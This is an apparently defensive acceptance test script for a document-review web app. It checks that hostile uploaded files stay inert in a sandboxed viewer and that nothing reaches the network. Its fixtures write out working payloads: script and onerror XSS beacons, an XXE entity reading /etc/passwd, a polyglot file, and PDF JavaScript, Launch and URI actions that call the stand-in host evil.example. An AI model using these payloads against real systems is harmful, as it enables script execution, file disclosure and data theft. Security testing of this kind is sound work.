#!/usr/bin/env bun
// Real HTTP and Chromium acceptance against a stamped production build. All inputs are synthetic.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { mkdirSync, readFileSync, writeFileSync, copyFileSync, openSync, closeSync, ftruncateSync } from 'node:fs';
import { resolve, join } from 'node:path';
import { parseArgs } from 'node:util';

const REPO = resolve(import.meta.dirname, '../../..');
const REVIEWED = '5aa7b91c3011ded3af57c3c14a23096d64712786';
const { values: args } = parseArgs({ options: {
  'app-root': { type: 'string', default: REPO }, out: { type: 'string' },
  revision: { type: 'string', default: REVIEWED }, corpus: { type: 'string' },
} });
assert(process.versions.bun === '1.4.2', 'acceptance requires Bun 1.4.2');
assert(args.out, '--out must name a disposable local evidence directory');
const out = resolve(args.out);
const root = resolve(args['app-root']);
const port = 43900, origPort = 43901, canaryPort = 43999;
if (process.env.CLEARCASE_OFFLINE !== '1') {
  const run = spawnSync('unshare', ['-rn', 'env', `OUTER_UID=${process.getuid()}`, `OUTER_GID=${process.getgid()}`,
    `CANARY_PORT=${canaryPort}`, join(REPO, 'tests/e2e/pilot/offline.sh'), process.execPath, import.meta.filename,
    ...process.argv.slice(2)], { stdio: 'inherit' });
  process.exit(run.status ?? 1);
}
process.env.CANARY_PORT = String(canaryPort);
mkdirSync(out, { recursive: true });
const runDir = join(out, `run-${Date.now()}-${process.pid}`);
mkdirSync(runDir);
const { buildCase, row, pdf } = await import(join(REPO, 'tests/e2e/pilot/lib/fixtures.ts'));
const { startServer } = await import(join(REPO, 'tests/e2e/pilot/lib/server.mjs'));
const { client, vpath } = await import(join(REPO, 'tests/e2e/pilot/lib/client.mjs'));
const { proveOffline } = await import(join(REPO, 'tests/e2e/pilot/lib/netproof.mjs'));
const { startCanary } = await import(join(REPO, 'tests/e2e/pilot/lib/canary.mjs'));
const { launch, frameEvaluator, sleep, DISABLED_FEATURES } = await import(join(REPO, 'tests/e2e/pilot/lib/cdp.mjs'));
const { openPage, attrById, originalsGet, pathOf, nextDownload } = await import(join(REPO, 'tests/e2e/pilot/v5/browser.mjs'));
const stamp = JSON.parse(readFileSync(join(root, 'build/clearcase-build.json'), 'utf8'));
assert.equal(stamp.revision, args.revision);
assert.equal(stamp.dirty, false);
assert.equal(stamp.bun, '1.4.2');
const results = [];
const test = async (id, fn) => {
  try { const evidence = await fn(); results.push({ id, status: 'PASS', evidence }); console.log(`PASS ${id}`); }
  catch (error) { results.push({ id, status: 'FAIL', error: String(error.stack ?? error) }); console.error(`FAIL ${id}: ${error.message}`); }
  writeFileSync(join(runDir, 'partial.json'), JSON.stringify({ reviewed: args.revision, results }, null, 2));
};
const enc = (s) => new TextEncoder().encode(s);
const beacon = `document.title='CC24 EXECUTED';localStorage.setItem('cc24-executed','yes');fetch('http://127.0.0.1:${canaryPort}/execute');top.location='http://evil.example/top'`;
const payloads = [
  { id: 'html', name: 'script.html', bytes: enc(`<html><script>${beacon}</script><img src=x onerror="${beacon}"></html>`) },
  { id: 'svg', name: 'script.svg', bytes: enc(`<svg xmlns="http://www.w3.org/2000/svg" onload="${beacon}"><script>${beacon}</script></svg>`) },
  { id: 'xml', name: 'external.xml', bytes: enc('<!DOCTYPE doc [<!ENTITY x SYSTEM "file:///etc/passwd">]><doc>&x;</doc>') },
  { id: 'polyglot', name: 'polyglot.pdf', bytes: enc(`<!-- %PDF-1.4 --><html><script>${beacon}</script></html>`) },
  { id: 'pdf-javascript', name: 'javascript.pdf', bytes: pdf('Synthetic JavaScript action', {
    catalog: '/OpenAction 6 0 R /Names << /JavaScript << /Names [(action) 6 0 R] >> >>',
    objects: "6 0 obj << /Type /Action /S /JavaScript /JS (app.alert('CC24 EXECUTED');this.submitForm('http://evil.example/pdf');) >> endobj",
  }) },
  { id: 'pdf-launch', name: 'launch.pdf', bytes: pdf('Synthetic launch action', { catalog: '/OpenAction 6 0 R', objects: '6 0 obj << /Type /Action /S /Launch /F (cc24-nonexistent.exe) >> endobj' }) },
  { id: 'pdf-uri', name: 'uri.pdf', bytes: pdf('Synthetic URI action', { catalog: '/OpenAction 6 0 R', objects: '6 0 obj << /Type /Action /S /URI /URI (http://evil.example/uri) >> endobj' }) },
];
if (args.corpus) {
  const corpus = resolve(args.corpus);
  const index = JSON.parse(readFileSync(join(corpus, 'index.json'), 'utf8'));
  for (const entry of index.filter((x) => /^cp-(html|svg|xml|pdf)-/.test(x.id) || x.id === 'cp-polyglot-03')) {
    payloads.push({ id: entry.id, name: `${entry.id}${entry.path.slice(entry.path.lastIndexOf('.'))}`, bytes: readFileSync(join(corpus, entry.path)), expected: entry.expected });
  }
}
const originals = Object.fromEntries(payloads.map((x) => [`HOSTILE/${x.name}`, x.bytes]));
const rows = payloads.map((x, i) => ({ ...row(`HX-${String(i + 1).padStart(3, '0')}`, 100 + i, `HOSTILE/${x.name}`, x.bytes.length), subject: `<img src=x onerror="${beacon}"> ${x.id}` }));
const sc = await buildCase(join(runDir, 'synthetic'), { caseId: 'cc24-synthetic', originals, rows,
  edit: (r) => { r.DATA.matter.storyline[0].t = `<script>${beacon}</script> <iframe src="http://evil.example/frame"></iframe> [[OD-001#p2]]`; },
});
const c = client(port);
const dataDir = join(runDir, 'data');
const start = () => startServer({ root, port, origPort, dataDir, buildDir: join(root, 'build'), logFile: join(runDir, 'server.log') });
let srv, browser, canary, page, importId;
try {
  await test('offline-production-bun', async () => {
    const proof = await proveOffline(); assert.equal(proof.pass, true);
    srv = await start();
    const health = await c.health();
    assert.equal(health.instance.pid, srv.pid);
    assert.equal(health.instance.dataDir, dataDir);
    assert.equal(health.instance.bun, '1.4.2');
    assert.deepEqual(health.instance.build, stamp);
    assert.equal(health.pragmas.main.journal_mode, 'wal');
    assert.equal(health.pragmas.work.journal_mode, 'delete');
    assert.equal(health.pragmas.main.synchronous, 2);
    assert.equal(health.pragmas.work.synchronous, 2);
    const listeners = spawnSync('ss', ['-ltnp'], { encoding: 'utf8' });
    assert.equal(listeners.status, 0);
    const lines = listeners.stdout.split('\n').filter((line) => new RegExp(`:(${port}|${origPort})\\b`).test(line));
    assert.equal(lines.length, 2);
    assert(lines.every((line) => line.includes('127.0.0.1:')));
    writeFileSync(join(runDir, 'health.json'), JSON.stringify(health, null, 2));
    writeFileSync(join(runDir, 'listeners.txt'), listeners.stdout);
    return { proof, listeners: lines, build: stamp };
  });
  assert(srv, 'production entry must start');
  canary = await startCanary();
  browser = await launch({ profileRoot: join(runDir, 'profiles'), extra: [`--disable-features=${DISABLED_FEATURES},NetworkTimeServiceQuerying`] });
  page = await openPage(browser);
  await test('canary-positive-control', async () => {
    const url = `http://127.0.0.1:${canaryPort}/cc24-control`;
    await page.navigate(url, { waitLoad: false });
    await sleep(150);
    assert(canary.hits.some((hit) => hit.path === '/cc24-control'));
    assert(browser.events.requests.some((request) => request.url === url));
    return { requestObserved: true, canaryObserved: true };
  });
  const before = browser.mark();
  await test('host-guard', async () => {
    const origin = srv.health.instance.originalsOrigin;
    for (const host of [`127.0.0.1:${origPort}`, `localhost:${origPort}`, `evil.example:${origPort}`, 'clearcase-originals.localhost', `clearcase-originals.localhost:${origPort + 1}`]) {
      assert.equal((await originalsGet(origin, '/_pdfjs/viewer.mjs', { headers: { host } })).status, 421, host);
    }
    assert.equal((await originalsGet(origin, `/_pdfjs/${srv.health.pdfjs}/viewer.mjs`)).status, 200);
    for (const path of ['/import', '/api/health', '/favicon.svg']) assert.equal((await c.get(path, { headers: { host: `evil.example:${port}` } })).status, 421);
    return { foreignHosts: 5, exactHost: 200, appPaths: 3 };
  });
  await test('preview-activation-narrative', async () => {
    const imp = await c.importPkg(sc.caseDir, sc.pkgDir); importId = imp.importId;
    assert(Number.isInteger(importId));
    const report = await c.report(importId); assert.notEqual(report.verdict, 'reject');
    assert.equal(await c.activeVersion(), null);
    await page.goto(`${c.origin}${vpath(sc.resultsVersion)}/overview`, 'document.querySelector("#candidate-banner")');
    assert.equal(await c.activeVersion(), null);
    assert.equal(await page.evaluate('document.querySelectorAll(".narrative script,.narrative iframe,.narrative img").length'), 0);
    assert.equal((await c.activate(importId)).status, 303);
    assert.equal(await c.activeVersion(), sc.resultsVersion);
    await page.goto(`${c.origin}${vpath(sc.resultsVersion)}/overview`, 'document.querySelector("#active-banner")');
    await page.evaluate("localStorage.setItem('cc24-origin-canary','preserved'); document.cookie='cc24=preserved; SameSite=Strict'");
    return { candidateDidNotActivate: true, activeVersion: sc.resultsVersion };
  });
  for (const [index, payload] of payloads.entries()) await test(`served-${payload.id}`, async () => {
    const caseMark = browser.mark();
    const ref = `HX-${String(index + 1).padStart(3, '0')}`;
    await page.goto(`${c.origin}${vpath(sc.resultsVersion)}/doc/${ref}`, `document.querySelector('main[data-ready="doc:${ref}"]')`);
    const hrefs = await page.evaluate('({open:document.querySelector("#open-original")?.href, download:document.querySelector("#download-original")?.href})');
    assert(hrefs.download, 'every indexed hostile original has a download');
    assert.equal(new URL(hrefs.download).origin, srv.health.instance.originalsOrigin);
    const served = await originalsGet(srv.health.instance.originalsOrigin, pathOf(hrefs.download));
    assert.equal(served.status, 200);
    assert.equal(served.sha256, createHash('sha256').update(payload.bytes).digest('hex'));
    assert.equal(served.headers['x-content-type-options'], 'nosniff');
    assert.match(served.headers['content-disposition'], /^attachment;/);
    const tab = await openPage(browser);
    let preview = 'attachment', viewer = null, isolation = null;
    try {
      if (hrefs.open && new URL(hrefs.open).pathname.startsWith('/view/')) {
        await tab.navigate(hrefs.open);
        await tab.waitFor('document.body.dataset.ready === "1" || document.body.dataset.ready === "error"');
        const sandbox = await tab.evaluate('document.querySelector("iframe")?.getAttribute("sandbox")');
        assert.equal(sandbox, 'allow-scripts');
        const frame = await frameEvaluator(browser, tab.sessionId, /\/_pdfjs\/[^/]+\/frame\.html/);
        viewer = await frame('window.__viewer');
        assert.equal(viewer.options.enableScripting, false);
        assert.equal(viewer.options.renderForms, false);
        isolation = await frame(`(() => { const attempt = (fn) => {try {return {allowed:true,value:fn()}} catch(e){return {allowed:false,error:e.name}}}; return {parent:attempt(()=>parent.document.cookie),cookies:attempt(()=>document.cookie),storage:attempt(()=>localStorage.getItem('cc24-origin-canary')),top:attempt(()=>{top.location='http://evil.example/escape';return true})}; })()`);
        assert(Object.values(isolation).every((x) => !x.allowed), JSON.stringify(isolation));
        assert.equal(await frame('document.querySelectorAll("a[href^=http]").length'), 0);
        preview = await tab.evaluate('document.body.dataset.ready');
        await tab.shot(join(runDir, `${payload.id}.png`));
        assert.equal(await tab.evaluate('location.href'), hrefs.open);
      } else if (hrefs.open) {
        await tab.navigate(hrefs.open);
        assert.equal(await tab.evaluate('document.querySelectorAll("script,iframe,object,embed,img,svg").length'), 0);
        assert.equal(await tab.evaluate('location.href'), hrefs.open);
        preview = 'inert-text';
        await tab.shot(join(runDir, `${payload.id}.png`));
      } else {
        const download = nextDownload(browser, (url) => url === hrefs.download);
        await tab.navigate(hrefs.download, { waitLoad: false });
        await download;
        assert.equal(await tab.evaluate('location.href'), 'about:blank');
      }
      assert.equal(await page.evaluate('localStorage.getItem("cc24-origin-canary")'), 'preserved');
      assert.equal(await page.evaluate('localStorage.getItem("cc24-executed")'), null);
      assert(!browser.events.dialogs.some((x) => x.message.includes('CC24 EXECUTED')));
      const externalRequests = browser.since(caseMark).requests.filter((x) => /^https?:/.test(x.url) && ![c.origin, srv.health.instance.originalsOrigin].includes(new URL(x.url).origin));
      assert.deepEqual(externalRequests, []);
      return { sha256: served.sha256, contentType: served.headers['content-type'], disposition: served.headers['content-disposition'], preview, viewer, isolation, externalRequests, appStoragePreserved: true, topNavigation: false };
    } finally { await tab.close(); }
  });
  await test('no-payload-execution-or-egress', async () => {
    await sleep(300);
    const events = browser.since(before);
    const pageEgress = events.requests.filter((x) => /^https?:/.test(x.url) && ![c.origin, srv.health.instance.originalsOrigin].includes(new URL(x.url).origin));
    assert.deepEqual(pageEgress, []);
    const execution = canary.hits.filter((x) => x.path?.includes('execute') || /evil\.example/.test(x.host ?? x.sni ?? ''));
    assert.deepEqual(execution, []);
    assert.deepEqual(events.dialogs, []);
    writeFileSync(join(runDir, 'network.json'), JSON.stringify({ requests: events.requests, canary: canary.hits }, null, 2));
    return { pageEgress, execution, requests: events.requests.length, backgroundCanaryConnections: canary.hits.length };
  });
  await test('failed-and-over-limit-import-preserve-work', async () => {
    const doc = `${vpath(sc.resultsVersion)}/doc/OD-001`;
    assert.equal((await c.form(`${doc}?/note`, { body: 'Synthetic CC24 durable note' })).status, 200);
    const broken = join(runDir, 'broken'); mkdirSync(broken);
    copyFileSync(join(sc.pkgDir, 'manifest.json'), join(broken, 'manifest.json'));
    const imp = await c.importPkg(sc.caseDir, broken);
    assert.equal((await c.report(imp.importId)).verdict, 'reject');
    const oversized = join(runDir, 'oversized'); mkdirSync(oversized);
    const fd = openSync(join(oversized, 'manifest.json'), 'w'); ftruncateSync(fd, 2 * 1024 * 1024); closeSync(fd);
    const over = await c.importPkg(sc.caseDir, oversized);
    const rep = await c.report(over.importId); assert.equal(rep.verdict, 'reject'); assert.equal(rep.codes.PKG_TOO_LARGE, 'error');
    assert.equal(await c.activeVersion(), sc.resultsVersion);
    assert.match((await c.get(doc)).text, /Synthetic CC24 durable note/);
    return { failedVerdict: 'reject', overLimitCodes: rep.codes, active: sc.resultsVersion, notePreserved: true };
  });
  await test('restart-recovery', async () => {
    const oldPid = srv.pid; await srv.stop('SIGKILL'); srv = await start();
    assert.notEqual(srv.pid, oldPid);
    assert.equal(await c.activeVersion(), sc.resultsVersion);
    const doc = `${c.origin}${vpath(sc.resultsVersion)}/doc/OD-001`;
    await page.goto(doc, 'document.querySelector("#note-body")');
    await page.waitFor('document.body.innerText.includes("Synthetic CC24 durable note")');
    assert.equal((await c.health()).recovery, null);
    await page.shot(join(runDir, 'restart.png'));
    return { oldPid, newPid: srv.pid, active: sc.resultsVersion, savedNoteRecovered: true };
  });
} catch (error) {
  results.push({ id: 'harness', status: 'FAIL', error: String(error.stack ?? error) });
} finally {
  await browser?.close().catch(() => {});
  await canary?.close().catch(() => {});
  if (srv) {
    const stopped = await srv.stop();
    results.push({ id: 'production-stop', status: stopped.graceful && stopped.appPort !== true && stopped.origPort !== true ? 'PASS' : 'FAIL', evidence: stopped });
  }
}
const ok = results.length === payloads.length + 8 && results.every((x) => x.status === 'PASS');
const summary = { ok, reviewed: args.revision, build: stamp, bun: process.versions.bun, synthetic: true, corpus: args.corpus ?? null, runDir, results };
writeFileSync(join(runDir, 'results.json'), JSON.stringify(summary, null, 2));
writeFileSync(join(out, 'latest.json'), JSON.stringify(summary, null, 2));
console.log(`${ok ? 'PASS' : 'FAIL'} -> ${join(runDir, 'results.json')}`);
process.exit(ok ? 0 : 1);
